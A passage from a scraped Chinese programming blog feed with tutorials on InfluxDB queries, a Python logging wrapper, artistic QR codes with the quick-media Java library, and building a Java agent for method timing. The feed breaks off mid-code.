小结这一小节内容，介绍的是最基础的inflxudb查询操作，和我们了解的SQL基本上没有太多的区别，可能唯一需要注意的就是制定保留策略查询时，需要使用&quot;&lt;retention policy&gt;&quot;.&lt;measurement&gt;的方式跟在from语句之后 其次一个需要注意的时，查询语句中，推荐的写法是 tag key或field key请使用双引号括起来 如果类型为string，请用单引号把过滤条件括起来 如下面这种写法，否则可能会出现问题 1select * from yhh where \"name\"='一灰灰' 下一篇，我们将介绍查询语句中常见的分组，排序，分页等场景的使用姿势 II. 其他0. 系列博文 190730-Influx Sql系列教程七：delete 删除数据 190729-Influx Sql系列教程六：insert 修改数据 190726-Influx Sql系列教程五：insert 添加数据 190723-Influx Sql系列教程四：series/point/tag/field 190721-Influx Sql系列教程三：measurement 表 190719-Influx Sql系列教程二：retention policy 保存策略 190718-Influx Sql系列教程一：database 数据库 190717-Influx Sql系列教程零：安装及influx-cli使用姿势介绍 190509-InfluxDb之时间戳显示为日期格式 190506-InfluxDB之配置修改 190505-InfluxDB之权限管理 180727-时序数据库InfluxDB之备份和恢复策略 180726-InfluxDB基本概念小结 180725-InfluxDB-v1.6.0安装和简单使用小结 参考博文 https://docs.influxdata.com/influxdb/v1.7/query_language/data_exploration/#the-basic-select-statement 1. 一灰灰Blog： https://liuyueyi.github.io/hexblog一灰灰的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 2. 声明尽信书则不如，已上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 3. 扫描关注一灰灰blog 知识星球","link":"/hexblog/2019/08/13/190813-Influx-Sql系列教程八：query数据查询基本篇/"},{"title":"191104-Python 封装一个通用日志插件","text":"日志对于一个应用程序而言，不可获取；特别是在问题定位，链路分析往往是最直观，最有效的富足工具；所以在python中可以怎样便捷的使用日志模块呢 I. logging 模块我们这里使用logging来记录我们的日志，一般来说，我们常用的日志无非以下几个点 日志落盘，存文件，支持定期生成一个备份文件；支持自动删除过期日志 异常时，可以输出完整的堆栈，帮助定位出问题的代码行 不同的日志level 1. 基本使用姿势首先我们来看一下日志模块的基本使用姿势，默认的场景下，日志输出在控制台；可以通过指定文件名的方式来讲日志输出到对应的文件中 1234567891011import logging# 通过下面的方式进行简单配置输出方式与日志级别logging.basicConfig(filename='logger.log', level=logging.INFO)# 下面是简单的使用姿势logging.debug('debug message')logging.info('info message')logging.warning('warn message')logging.error('error message')logging.critical('critical message') 因为指定了日志的级别为INFO，所以debug日志将不会显示在日志文件中，具体输出如下 1234INFO:root:info messageWARNING:root:warn messageERROR:root:warn messageCRITICAL:root:critical message 2. formatter上面的使用虽说实现了日志记录的功能，但是相对原始；通常我们希望日志的输出包括一些基本信息，如输出日志的时间 这个时候就可以考虑通过format来设置输出日志的格式 格式 描述 %(levelno)s 打印日志级别的数值 %(levelname)s 打印日志级别名称 %(pathname)s 打印当前执行程序的路径 %(filename)s 打印当前执行程序名称 %(funcName)s 打印日志的当前函数 %(lineno)d 打印日志的当前行号 %(asctime)s 打印日志的时间 %(thread)d 打印线程id %(threadName)s 打印线程名称 %(process)d 打印进程ID %(message)s 打印日志信息 下面我们在日志的输出中，添加上时间 1234567891011121314import logging# 创建一个名为test的日志实例logger = logging.getLogger('test')# 创建一个handler，指定输出日志文件为logger.log, 并设定输出样式fh = logging.FileHandler(filename='logger.log')fh.setFormatter(logging.Formatter('%(asctime)s - %(levelname)s - %(message)s'))# 配置logger.addHandler(fh)# 设置日志输出级别为INFOlogger.setLevel(logging.INFO)logger.info('new info message') 实际输出结果如 12019-11-04 18:25:57,519 - INFO - new info message 3. Handler 一下几个说明，主要来自博文: Python模块之Logging（四）——常用handlers的使用 a. StreamHandler流handler——包含在logging模块中的三个handler之一。 能够将日志信息输出到sys.stdout, sys.stderr 或者类文件对象（更确切点，就是能够支持write()和flush()方法的对象） 1logging.StreamHandler(stream=None) b. FileHandler继承自StreamHandler。将日志信息输出到磁盘文件上 1logging.FileHandler(filename, mode='a', encoding=None, delay=False) c. NullHandler什么都不干，相当于吃掉日志 d. WatchedFileHandler位于logging.handlers模块中。用于监视文件的状态，如果文件被改变了，那么就关闭当前流，重新打开文件，创建一个新的流。由于newsyslog或者logrotate的使用会导致文件改变。这个handler是专门为linux/unix系统设计的，因为在windows系统下，正在被打开的文件是不会被改变的 e. RotatingFileHandler位于logging.handlers支持循环日志文件。 1logging.handlers.RotatingFileHandler(filename, mode='a', maxBytes=0, backupCount=0, encoding=None, delay=0) 参数maxBytes和backupCount允许日志文件在达到maxBytes时rollover.当文件大小达到或者超过maxBytes时，就会新创建一个日志文件。上述的这两个参数任一一个为0时，rollover都不会发生。也就是就文件没有maxBytes限制。backupcount是备份数目，也就是最多能有多少个备份。命名会在日志的base_name后面加上.0-.n的后缀，如example.log.1,example.log.1,…,example.log.10。当前使用的日志文件为base_name.log。 f. TimedRotatingFileHandler定时循环日志handler，位于logging.handlers，支持定时生成新日志文件。 1logging.handlers.TimedRotatingFileHandler(filename, when='h', interval=1, backupCount=0, encoding=None, delay=False, utc=False) 参数when决定了时间间隔的类型，参数interval决定了多少的时间间隔。如when=‘D’，interval=2，就是指两天的时间间隔，backupCount决定了能留几个日志文件。超过数量就会丢弃掉老的日志文件 symbol 说明 ‘S’ | 秒‘M’ | 分‘H’ | 时‘D’ | 天‘W0’-‘W6’ | 周一至周日‘midnight’ | 每天的凌晨 I. 日志模块封装接下来我们的目标是封装一个简单好用的日志工具类 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950# -*- coding: utf-8 -*-import loggingimport osfrom logging.handlers import TimedRotatingFileHandlerclass LoggerWrapper: def __init__(self): self._logger = {} @staticmethod def _get_path(action, path=\"\"): \"\"\" 根据日志名，创建对应的日志路径 :param path: :return: \"\"\" if action != 'logs': action = \"logs/\" + action + \"/\" path = action + path if not os.path.exists(path): # 当目录不存在时，主动创建 os.makedirs(path) return path def _gen_logger(self, action='logs', log_name='Crawler'): base_logger = logging.getLogger(log_name) base_logger.setLevel(logging.INFO) log_file = self._get_path(action, log_name) + \"/\" + log_name + \".log\" ch = TimedRotatingFileHandler(log_file, when='D', encoding=\"utf-8\", backupCount=10) ch.setLevel(logging.INFO) formatter = logging.Formatter('%(asctime)s - %(levelname)s - %(message)s') ch.setFormatter(formatter) base_logger.addHandler(ch) base_logger.propagate = 0 return base_logger def get_logger(self, name=None): if name is None: key = env_wrapper.get_current_task_name() else: key = name if key not in self._logger: action, path = key, env_wrapper.get_current_task_name() self._logger[key] = self._gen_logger(action, path) return self._logger[key] 上面是一个简单的按天回滚日志，且只保存最近10天；但是在我们的测试环境下，我们可能希望日志也同时输出一份到控制台 因此我们可以稍微改造一下，拿一个EnvWrapper类，来保存项目根路径，是否输出一份到控制台 1234567891011121314151617class EnvWrapper: def __init__(self): self._module_path = None self._log_console = False def init_env(xxx): # 下面是环境初始化 pass def get_module_path(self): return self._module_path def console_log_enable(self): return self._log_console env_wrapper = EnvWrapper()` 然后我们的日志工具类可以改造成下面的case 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091929394959697# -*- coding: utf-8 -*-# create by yihui 11:32 18/12/19import loggingimport osfrom logging.handlers import TimedRotatingFileHandlerfrom src.env.EnvWrapper import env_wrapperclass LoggerWrapper: def __init__(self): self._logger = {} self._console_init = False @staticmethod def _get_path(action, path=\"\"): \"\"\" 根据日志名，创建对应的日志路径 :param path: :return: \"\"\" if action != 'logs': action = \"logs/\" + action + \"/\" path = env_wrapper.get_module_path() + \"/\" + action + path if not os.path.exists(path): # 当目录不存在时，主动创建 os.makedirs(path) return path def _gen_logger(self, action='logs', log_name='Crawler'): base_logger = logging.getLogger(log_name) base_logger.setLevel(logging.INFO) log_file = self._get_path(action, log_name) + \"/\" + log_name + \".log\" ch = TimedRotatingFileHandler(log_file, when='D', encoding=\"utf-8\") ch.setLevel(logging.INFO) formatter = logging.Formatter('%(asctime)s - %(levelname)s - %(message)s') ch.setFormatter(formatter) base_logger.addHandler(ch) base_logger.propagate = 0 if env_wrapper.console_log_enable() and not self._console_init: console = logging.StreamHandler() console.setLevel(logging.DEBUG) console.setFormatter(formatter) base_logger.addHandler(console) self._console_init = True return base_logger def get_logger(self, name=None): if name is None: key = env_wrapper.get_current_task_name() else: key = name if key not in self._logger: action, path = key, env_wrapper.get_current_task_name() self._logger[key] = self._gen_logger(action, path) return self._logger[key] def error(self, msg, name=None): log = self.get_logger(name) log.error(msg) def warn(self, msg, name=None): log = self.get_logger(name) log.warning(msg) def info(self, msg, name=None): log = self.get_logger(name) log.info(msg) def debug(self, msg, name=None): log = self.get_logger(name) log.debug(msg) def exception(self, msg, name=None): \"\"\" 打印堆栈信息 :param msg: :param name: :return: \"\"\" log = self.get_logger(name) log.exception(msg)SpiderLogger = LoggerWrapper()logger = SpiderLogger.get_loggerdebug = SpiderLogger.debuginfo = SpiderLogger.infoerror = SpiderLogger.errorwarning = SpiderLogger.warnexception = SpiderLogger.exception III. 其他1. 一灰灰Blog： https://liuyueyi.github.io/hexblog一灰灰的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 2. 声明尽信书则不如，已上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 3. 扫描关注一灰灰blog 知识星球","link":"/hexblog/2019/11/04/191104-Python-封装一个通用日志工具类/"},{"title":"191113-Quick-Media Java生成艺术二维码也可以很简单","text":"现在二维码可以说非常常见了，当然我们见得多的一般是白底黑块，有的再中间加一个logo，或者将二维码嵌在一张特定的背景中（比如微信、支付宝的收款码）；偶尔也可能看到一些酷炫的二维码，比如非黑白的、渐变色的、非方块样式的，或者说是动态的二维码 那么问题来了，走位一个java开发者而言，有没有什么开源库，可以简单迅速不烧脑的实现各种炫酷的二维码呢？ 接下来我们将介绍下，如何借助 https://github.com/liuyueyi/quick-media 项目的 qrcode-plugin 来生成各种酷炫的二维码 1. 配置我们主要使用的quick-media项目其中的一个插件：qrcode-plugin，目前已提供maven的引入方式，最新版本为2.1 12345678910111213&lt;repositories&gt; &lt;repository&gt; &lt;id&gt;yihui-maven-repo&lt;/id&gt; &lt;url&gt;https://raw.githubusercontent.com/liuyueyi/maven-repository/master/repository&lt;/url&gt; &lt;/repository&gt;&lt;/repositories&gt;&lt;dependency&gt; &lt;groupId&gt;com.github.hui.media&lt;/groupId&gt; &lt;artifactId&gt;qrcode-plugin&lt;/artifactId&gt; &lt;version&gt;2.2&lt;/version&gt;&lt;/dependency&gt; 添加依赖之后，我们就可以愉快的玩耍了 2. 实例演示接下来我们通过一系列的实例代码，来演示如何生成各种酷炫的二维码 a. 基本二维码生成一个最常见的最普通的二维码，并保存到qr.png文件，一行代码即可 123String msg = \"https://weixin.qq.com/r/FS9waAPEg178rUcL93oH\";// 生成二维码，并输出为qr.png图片boolean ans = QrCodeGenWrapper.of(msg).asFile(\"qr.png\"); b. 颜色指定默认的二维码为白底黑块，如果我希望生成白底蓝块（探测图形外青内红）的二维码，可以如下使用 123456789101112String msg = \"https://weixin.qq.com/r/FS9waAPEg178rUcL93oH\";boolean ans = QrCodeGenWrapper.of(msg) .setW(300) // 定位点(探测图形)外边颜色 .setDetectOutColor(Color.CYAN) // 定位点内部颜色 .setDetectInColor(Color.RED) // 二维码着色点 .setDrawPreColor(Color.BLUE) // 二维码背景图 .setDrawBgColor(0xffffffff) .asFile(\"/tmp/cqr.png\"); c. 带logo二维码生成logo目前支持两种样式，一个是圆角logo，一个是直接原图不做处理；下面是一个简单的圆角logo，并带上边框的实例 1234567891011String msg = \"https://weixin.qq.com/r/FS9waAPEg178rUcL93oH\";// 这里的图片地址，支持网络图片，本地相对路劲图片，本地绝对路径图片String logo = \"https://static.oschina.net/uploads/user/283/566591_100.jpeg\";boolean ans = QrCodeGenWrapper.of(msg) .setLogo(logo) .setLogoStyle(QrCodeOptions.LogoStyle.ROUND) .setLogoBgColor(0xfffefefe) .setLogoBorderBgColor(0xffc7c7c7) .setLogoBorder(true) .asFile(\"/tmp/lqr3.png\");` 下图展示了四张带logo的二维码 原始logo 直角带logo背景色 圆角带logo背景色 圆角带logo背景，边框 d. 指定背景图背景图目前支持三种样式，分别是二维码全覆盖在背景图上，在背景图的自定区间进行绘制二维码，生成透明二维码但使用背景图进行渲染，下面 1234567891011121314151617181920212223242526272829303132// 默认属于全覆盖的背景模式，对应下图中左图String msg = \"https://weixin.qq.com/r/FS9waAPEg178rUcL93oH\";String bg = \"https://ww1.sinaimg.cn/large/8154e929gy1g8vho8x6r0j20b40b43yl.jpg\";boolean ans = QrCodeGenWrapper.of(msg) .setBgImg(bg) .setW(500) .setBgOpacity(0.5f) .asFile(\"/tmp/bqr1.png\");// 指定为填充模式，在背景图的坐标(startX, startY)处绘制二维码(左上角坐标为0,0; 对应下图中的中图 bg = \"https://pic.51yuansu.com/pic3/cover/01/07/09/59015a0e53d83_610.jpg\";ans = QrCodeGenWrapper.of(msg) .setBgImg(bg) .setBgStyle(QrCodeOptions.BgImgStyle.FILL) .setBgW(500) .setBgH(500) .setBgStartX(130) .setBgStartY(120) .setW(260) .setPadding(0) .setDrawBgColor(0xfff7f7f7) .asFile(\"/tmp/bqr2.png\"); // 背景渲染方式，用背景图来填充二维码，对应下图中的右图bg = \"https://img1.juimg.com/180517/355855-1P51H3520817.jpg\";ans = QrCodeGenWrapper.of(msg) .setBgImg(bg) .setBgStyle(QrCodeOptions.BgImgStyle.PENETRATE) .setBgW(500) .setBgH(500) .setW(500) .asFile(\"/tmp/bqr3.png\"); e. 几何样式二维码生成默认的二维码的信息为黑色小方块，本插件提供了其他的几个常见的几何形式支持，如圆点，三角，钻石，六边形，八边形；通过指定DrawStyle参数即可 1234567String msg = \"https://weixin.qq.com/r/FS9waAPEg178rUcL93oH\";boolean ans = QrCodeGenWrapper.of(msg) .setW(400) // 支持将临近相同的合并成一个大的圆点 .setDrawEnableScale(true) .setDrawStyle(QrCodeOptions.DrawStyle.CIRCLE) .asFile(\"/tmp/dqr6.png\"); f. 图片填充如果你有一套完整的素材，那么可以考虑用这些素材来生成一个更漂亮的二维码； 比如项目的测试中，给出了两套输出，一个爱心，一个集合图形 12345678910111213141516171819String msg = \"https://weixin.qq.com/r/FS9waAPEg178rUcL93oH\";int size = 500;boolean ans = QrCodeGenWrapper.of(msg) .setW(size) .setH(size) .setErrorCorrection(ErrorCorrectionLevel.H) // 因为素材为png透明图，我们这里设置二维码的背景为透明，输出更加优雅 .setDrawBgColor(ColorUtil.OPACITY) .setDetectImg(\"jihe/PDP.png\") .setDrawStyle(QrCodeOptions.DrawStyle.IMAGE) .addImg(1, 1, \"jihe/a.png\") .addImg(3, 1, \"jihe/b.png\") .addImg(1, 3, \"jihe/c.png\") .addImg(3, 2, \"jihe/e.png\") .addImg(2, 3, \"jihe/f.png\") .addImg(2, 2, \"jihe/g.png\") .addImg(3, 4, \"jihe/h.png\") .setPicType(\"png\") .asFile(\"/tmp/imgQr1.png\"); 使用这种方式，需要稍微注意一下 必须制定DrawStyle为图片模式 addImg(row, column, img) 来声明素材对应的应用场景，这个表示当出现一个row行，column列都有信息时，用img来填充 下面是一个是quick-media提供的两种样式模板 g. 动态二维码接下来介绍一下动态二维码的生成，和背景图的使用姿势基本上完全以往，唯一的区别就是背景图为gif动图 12345678910111213141516171819202122232425262728293031// 全覆盖模式，指定二维码的透明度（如下图左）String msg = \"https://weixin.qq.com/r/FS9waAPEg178rUcL93oH\";String bg = \"https://ww1.sinaimg.cn/large/8154e929gy1g8pq78mcgrg20dw0boaja.gif\";boolean ans = QrCodeGenWrapper.of(msg) .setW(500) .setBgImg(bg) .setBgOpacity(0.6f) .setPicType(\"gif\") .asFile(\"/tmp/gifQr1.gif\"); // 填充模式，在背景图的指定位置上绘制二维码，属于常见的一种动图模式（如下图中）bg = \"https://ww1.sinaimg.cn/large/8154e929gy1g8qe2iv0evg20xc0irn68.gif\";boolean ans = QrCodeGenWrapper.of(msg) .setW(400) .setBgImg(bg) .setBgStyle(QrCodeOptions.BgImgStyle.FILL) .setBgStartX(20) .setBgStartY(137) .setPicType(\"gif\") .asFile(\"/tmp/gifQr2.gif\");// 背景渲染模式，直接用背景图来填充二维码信息，因此可以实现炫酷的二维码（如下图右）bg = \"https://ww1.sinaimg.cn/large/8154e929gy1g8w7wj6qvsg20oy0io4dt.gif\";boolean ans = QrCodeGenWrapper.of(msg) .setBgImg(bg) .setBgW(500) .setBgH(500) .setBgStyle(QrCodeOptions.BgImgStyle.PENETRATE) .setW(500) .asFile(\"/tmp/gifQr3.gif\"); h. 综合上面的几种case，是可以组合使用的，最后给一个综合的”求关注”动态二维码的生成实例 123456789101112131415161718192021222324252627282930313233String msg = \"https://weixin.qq.com/r/FS9waAPEg178rUcL93oH\";// 网络动图背景String bg = \"https://ww1.sinaimg.cn/large/8154e929gy1g8w9jsxwtdg20pz08zwr8.gif\";// 本地logoString logo = \"logo.jpg\";boolean ans = QrCodeGenWrapper.of(msg) .setW(500) .setDrawBgColor(ColorUtil.OPACITY) .setDrawStyle(QrCodeOptions.DrawStyle.IMAGE) .setDetectImg(\"jihe/PDP.png\") .addImg(1, 1, \"jihe/a.png\") .addImg(3, 1, \"jihe/b.png\") .addImg(1, 3, \"jihe/c.png\") .addImg(3, 2, \"jihe/e.png\") .addImg(2, 3, \"jihe/f.png\") .addImg(2, 2, \"jihe/g.png\") .addImg(3, 4, \"jihe/h.png\") .setPadding(1) .setErrorCorrection(ErrorCorrectionLevel.H) .setLogo(logo) .setLogoBorder(true) .setLogoStyle(QrCodeOptions.LogoStyle.ROUND) .setLogoBgColor(0xfffefefe) .setLogoBorderBgColor(0xffc7c7c7) .setBgImg(bg) .setBgW(1870) .setBgH(646) .setBgStyle(QrCodeOptions.BgImgStyle.FILL) .setBgStartX(690) .setBgStartY(20) .setBgOpacity(0.9f) .setPicType(\"gif\") .asFile(\"/tmp/gifQr4.gif\"); II. 其他1. 一灰灰Blog： https://liuyueyi.github.io/hexblog一灰灰的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 项目地址: https://github.com/liuyueyi/quick-media 2. 声明尽信书则不如，已上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 3. 扫描关注一灰灰blog 知识星球","link":"/hexblog/2019/11/13/191113-Quick-Media-Java生成艺术二维码也可以很简单/"},{"title":"200316-IDEA + maven零基础构建java agent项目","text":"Java Agent(java探针)虽说在jdk1.5之后就有了，但是对于绝大多数的业务开发javaer来说，这个东西还是比较神奇和陌生的；虽说在实际的业务开发中，很少会涉及到agent开发，但是每个java开发都用过，比如使用idea写了个HelloWorld.java,并运行一下, 仔细看控制台输出 本篇将作为Java Agent的入门篇，手把手教你开发一个统计方法耗时的Java Agent I. Java Agent开发首先明确我们的开发环境，选择IDEA作为编辑器，maven进行包管理 1. 核心逻辑创建一个新的项目(or子module)，然后我们新建一个SimpleAgent类 12345678910111213141516171819202122public class SimpleAgent { /** * jvm 参数形式启动，运行此方法 * * @param agentArgs * @param inst */ public static void premain(String agentArgs, Instrumentation inst) { System.out.println(\"premain\"); } /** * 动态 attach 方式启动，运行此方法 * * @param agentArgs * @param inst */ public static void agentmain(String agentArgs, Instrumentation inst) { System.out.println(\"agentmain\"); }} 我们先忽略上面两个方法的具体玩法，先简单看一下这两个方法的区别，注释上也说了 jvm参数形式： 调用 premain 方法 attach方式： 调用 agentmain 方法 其中jvm方式，也就是说要使用这个agent的目标应用，在启动的时候，需要指定jvm参数 -javaagent:xxx.jar，当我们提供的agent属于基础必备服务时，可以用这种方式 当目标应用程序启动之后，并没有添加-javaagent加载我们的agent，依然希望目标程序使用我们的agent，这时候就可以使用attach方式来使用（后面会介绍具体的使用姿势），自然而然的会想到如果我们的agent用来debug定位问题，就可以用这种方式 2. 打包上面一个简单SimpleAgent就把我们的Agent的核心功能写完了（就是这么简单），接下来需要打一个Jar包 通过maven插件，可以比较简单的输出一个合规的java agent包，有两种常见的使用姿势 a. pom指定配置在pom.xml文件中，添加如下配置，请注意一下manifestEntries标签内的参数 123456789101112131415161718192021222324252627282930&lt;build&gt; &lt;plugins&gt; &lt;plugin&gt; &lt;groupId&gt;org.apache.maven.plugins&lt;/groupId&gt; &lt;artifactId&gt;maven-assembly-plugin&lt;/artifactId&gt; &lt;configuration&gt; &lt;descriptorRefs&gt; &lt;descriptorRef&gt;jar-with-dependencies&lt;/descriptorRef&gt; &lt;/descriptorRefs&gt; &lt;archive&gt; &lt;manifestEntries&gt; &lt;Premain-Class&gt;com.git.hui.agent.SimpleAgent&lt;/Premain-Class&gt; &lt;Agent-Class&gt;com.git.hui.agent.SimpleAgent&lt;/Agent-Class&gt; &lt;Can-Redefine-Classes&gt;true&lt;/Can-Redefine-Classes&gt; &lt;Can-Retransform-Classes&gt;true&lt;/Can-Retransform-Classes&gt; &lt;/manifestEntries&gt; &lt;/archive&gt; &lt;/configuration&gt; &lt;executions&gt; &lt;execution&gt; &lt;goals&gt; &lt;goal&gt;attached&lt;/goal&gt; &lt;/goals&gt; &lt;phase&gt;package&lt;/phase&gt; &lt;/execution&gt; &lt;/executions&gt; &lt;/plugin&gt; &lt;/plugins&gt;&lt;/build&gt; 然后通过 mvn assembly:assembly 命令打包，在target目录下，可以看到一个后缀为jar-with-dependencies的jar包，就是我们的目标 b. MANIFEST.MF 配置文件通过配置文件MANIFEST.MF，可能更加常见，这里也简单介绍下使用姿势 在资源目录(Resources)下，新建目录META-INF 在META-INF目录下，新建文件MANIFEST.MF 文件内容如下 12345Manifest-Version: 1.0Premain-Class: com.git.hui.agent.SimpleAgentAgent-Class: com.git.hui.agent.SimpleAgentCan-Redefine-Classes: trueCan-Retransform-Classes: true 请注意，最后的一个空行(如果我上面没有显示的话，多半是markdown渲染有问题)，不能少，在idea中，删除最后一行时，会有错误提醒 然后我们的pom.xml配置，需要作出对应的修改 123456789101112131415161718192021222324252627282930313233&lt;build&gt; &lt;plugins&gt; &lt;plugin&gt; &lt;groupId&gt;org.apache.maven.plugins&lt;/groupId&gt; &lt;artifactId&gt;maven-assembly-plugin&lt;/artifactId&gt; &lt;configuration&gt; &lt;descriptorRefs&gt; &lt;descriptorRef&gt;jar-with-dependencies&lt;/descriptorRef&gt; &lt;/descriptorRefs&gt; &lt;archive&gt; &lt;manifestFile&gt; src/main/resources/META-INF/MANIFEST.MF &lt;/manifestFile&gt; &lt;!--&lt;manifestEntries&gt;--&gt; &lt;!--&lt;Premain-Class&gt;com.git.hui.agent.SimpleAgent&lt;/Premain-Class&gt;--&gt; &lt;!--&lt;Agent-Class&gt;com.git.hui.agent.SimpleAgent&lt;/Agent-Class&gt;--&gt; &lt;!--&lt;Can-Redefine-Classes&gt;true&lt;/Can-Redefine-Classes&gt;--&gt; &lt;!--&lt;Can-Retransform-Classes&gt;true&lt;/Can-Retransform-Classes&gt;--&gt; &lt;!--&lt;/manifestEntries&gt;--&gt; &lt;/archive&gt; &lt;/configuration&gt; &lt;executions&gt; &lt;execution&gt; &lt;goals&gt; &lt;goal&gt;attached&lt;/goal&gt; &lt;/goals&gt; &lt;phase&gt;package&lt;/phase&gt; &lt;/execution&gt; &lt;/executions&gt; &lt;/plugin&gt; &lt;/plugins&gt;&lt;/build&gt; 同样通过mvn assembly:assembly命令打包 II. Agent使用agent有了，接下来就是需要测试一下使用agent的使用了，上面提出了两种方式，我们下面分别进行说明 1. jvm参数首先新建一个demo项目，写一个简单的测试类 12345678910111213141516171819202122232425public class BaseMain { public int print(int i) { System.out.println(\"i: \" + i); return i + 2; } public void run() { int i = 1; while (true) { i = print(i); try { Thread.sleep(1000); } catch (InterruptedException e) { e.printStackTrace(); } } } public static void main(String[] args) throws InterruptedException { BaseMain main = new BaseMain(); main.run(); Thread.sleep(1000 * 60 * 60); }} 测试类中，有一个死循环，各1s调用一下print方法，IDEA测试时，可以直接在配置类，添加jvm参数，如下 请注意上面红框的内容为上一节打包的agent绝对地址: -javaagent:/Users/..../target/java-agent-1.0-SNAPSHOT-jar-with-dependencies.jar 执行main方法之后，会看到控制台输出 请注意上面的premain， 这个就是我们上面的SimpleAgent中的premain方法输出，且只输出了一次 2. attach方式在使用attach方式时，可以简单的理解为要将我们的agent注入到目标的应用程序中，所以我们需要自己起一个程序来完成这件事情 123456789public class AttachMain { public static void main(String[] args) throws IOException, AgentLoadException, AgentInitializationException, AttachNotSupportedException { // attach方法参数为目标应用程序的进程号 VirtualMachine vm = VirtualMachine.attach(\"36633\"); // 请用你自己的agent绝对地址，替换这个 vm.loadAgent(\"/Users/......./target/java-agent-1.0-SNAPSHOT-jar-with-dependencies.jar\"); }} 上面的逻辑比较简单，首先通过jps -l获取目标应用的进程号 当上面的main方法执行完毕之后，控制台会输出类似下面的两行日志，可以简单的理解为我连上目标应用，并丢了一个agent，然后挥一挥衣袖不带走任何云彩的离开了 12Connected to the target VM, address: &apos;127.0.0.1:63710&apos;, transport: &apos;socket&apos;Disconnected from the target VM, address: &apos;127.0.0.1:63710&apos;, transport: &apos;socket&apos; 接下来再看一下上面的BaseMain的输出，中间夹着一行agentmain, 就表明agent被成功注入进去了 3. 小结本文介绍了maven + idea环境下，手把手教你开发一个hello world版JavaAgent 并打包的全过程 两个方法 方法 说明 使用姿势 premain() agent以jvm方式加载时调用，即目标应用在启动时，指定了agent -javaagent:xxx.jar agentmain() agent以attach方式运行时调用，目标应用程序正常工作时使用 VirtualMachine.attach(pid)来指定目标进程号 vm.loadAgent(&quot;...jar&quot;)加载agent 两种打包姿势 打包为可用的java agent时，需要注意配置参数，上面提供了两种方式，一个是直接在pom.xml中指定配置 123456&lt;manifestEntries&gt; &lt;Premain-Class&gt;com.git.hui.agent.SimpleAgent&lt;/Premain-Class&gt; &lt;Agent-Class&gt;com.git.hui.agent.SimpleAgent&lt;/Agent-Class&gt; &lt;Can-Redefine-Classes&gt;true&lt;/Can-Redefine-Classes&gt; &lt;Can-Retransform-Classes&gt;true&lt;/Can-Retransform-Classes&gt;&lt;/manifestEntries&gt; 另外一个是在配置文件 META-INF/MANIFEST.MF 中写好(需要注意最后一个空行不可或缺） 12345Manifest-Version: 1.0Premain-Class: com.git.hui.agent.SimpleAgentAgent-Class: com.git.hui.agent.SimpleAgentCan-Redefine-Classes: trueCan-Retransform-Classes: true 当然本篇内容看完之后，会发现对java agent的实际开发还是不太清楚，难道agent就是在前面输出一行hello world就完事了么，这和想象中的完全不一样啊 下一篇博文将手把手教你实现一个方法统计耗时的java agent包，将详细说明利用接口Instrumentation来实现字节码修改，从而是实现功能增强 II. 其他0. 源码 https://github.com/liuyueyi/java-agent 1. 一灰灰Blog： https://liuyueyi.github.io/hexblog一灰灰的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 2. 声明尽信书则不如，已上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 3. 扫描关注一灰灰blog","link":"/hexblog/2020/03/16/200316-IDEA-maven零基础构建java-agent项目/"},{"title":"200316-手把手教你实现一个方法耗时统计的java agent","text":"前面有两篇铺垫博文，在博文《200303-如何优雅的在java中统计代码块耗时》，其最后提到了根据利用java agent来统计方法耗时 博文《200316-IDEA + maven零基础构建java agent项目中则详细描述了搭建一个java agent开发测试项目的全过程 本篇博文将进入java agent的实战，手把手教你如何是实现一个统计方法耗时的java agent 1. 基本姿势点上面两节虽然手把手教你实现了一个hello world版agent，然而实际上对java agent依然是一脸茫然，所以我们得先补齐一下基础知识 首先来看agent的两个方法中的参数 Instrumentation，我们先看一下它的接口定义 1234567891011121314151617181920212223242526/** * 注册一个Transformer，从此之后的类加载都会被Transformer拦截。 * Transformer可以直接对类的字节码byte[]进行修改 */void addTransformer(ClassFileTransformer transformer);/** * 对JVM已经加载的类重新触发类加载。使用的就是上面注册的Transformer。 * retransformation可以修改方法体，但是不能变更方法签名、增加和删除方法/类的成员属性 */void retransformClasses(Class&lt;?&gt;... classes) throws UnmodifiableClassException;/** * 获取一个对象的大小 */long getObjectSize(Object objectToSize);/** * 将一个jar加入到bootstrap classloader的 classpath里 */void appendToBootstrapClassLoaderSearch(JarFile jarfile);/** * 获取当前被JVM加载的所有类对象 */Class[] getAllLoadedClasses(); 前面两个方法比较重要，addTransformer方法配置之后，后续的类加载都会被Transformer拦截。对于已经加载过的类，可以执行retransformClasses来重新触发这个Transformer的拦截。类加载的字节码被修改后，除非再次被retransform，否则不会恢复。 通过上面的描述，可知 可以通过Transformer修改类 类加载时，会被触发Transformer拦截 2. 实现我们需要统计方法耗时，所以想到的就是在方法的执行前，记录一个时间，执行完之后统计一下时间差，即为耗时 直接修改字节码有点麻烦，因此我们借助神器javaassist来修改字节码 实现自定义的ClassFileTransformer，代码如下 12345678910111213141516171819202122232425262728293031public class CostTransformer implements ClassFileTransformer { @Override public byte[] transform(ClassLoader loader, String className, Class&lt;?&gt; classBeingRedefined, ProtectionDomain protectionDomain, byte[] classfileBuffer) { // 这里我们限制下，只针对目标包下进行耗时统计 if (!className.startsWith(\"com/git/hui/java/\")) { return classfileBuffer; } CtClass cl = null; try { ClassPool classPool = ClassPool.getDefault(); cl = classPool.makeClass(new ByteArrayInputStream(classfileBuffer)); for (CtMethod method : cl.getDeclaredMethods()) { // 所有方法，统计耗时；请注意，需要通过`addLocalVariable`来声明局部变量 method.addLocalVariable(\"start\", CtClass.longType); method.insertBefore(\"start = System.currentTimeMillis();\"); String 